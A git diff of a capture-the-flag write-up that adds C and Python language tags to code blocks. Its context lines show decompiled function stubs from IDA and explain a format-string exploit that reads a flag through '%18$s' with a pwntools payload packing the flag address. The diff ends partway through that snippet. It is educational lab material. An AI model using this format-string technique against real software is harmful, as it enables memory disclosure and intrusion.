@@ -46,7 +46,7 @@ Clearly its not handling format strings properly according to the output above. 
 According to IDA we have the following functions:
 
 #####main:
-```
+```C
 int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
 {
     int v3; // eax@2
@@ -95,7 +95,7 @@ int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
 ```
 
 #####print_menu:
-```
+```C
 int print_menu()
 {
     int v0; // ST1C_4@1
@@ -107,7 +107,7 @@ int print_menu()
 ```
 
 #####add_entry:
-```
+```C
 int __cdecl add_entry(char *a1)
 {
     int v2; // [sp+1Ch] [bp-Ch]@1
@@ -125,7 +125,7 @@ int __cdecl add_entry(char *a1)
 ```
 
 #####print_entry:
-```
+```C
 int __cdecl print_entry(const char *a1)
 {
     int v1; // ST1C_4@1
@@ -137,7 +137,7 @@ int __cdecl print_entry(const char *a1)
 ```
 
 #####flag:
-```
+```C
 int flag()
 {
     int v0; // ST1C_4@1
@@ -200,7 +200,7 @@ AAAA41414141
 
 So that's fantastic, we now know that the 18th item down is going to be our format string, this means we can dereference it using %18$s and the only issue now is getting it to be our flag address, 0x0804a0a0, rather than 'AAAA'. Normally we could just do `python -c "print '<address_in_little_endian>'+'%18$s'"` to properly parse the hex and pass it but due to that damn menu, this obviously won't work. Instead this is where pwntools comes in. Fire up python and do the following:
 
-```
+```Python
 from pwn import * # import all pwntools libraries
 
 payload = p32(134520992)+'%18$s' # pack the integer to hex and append %18$s as the payload
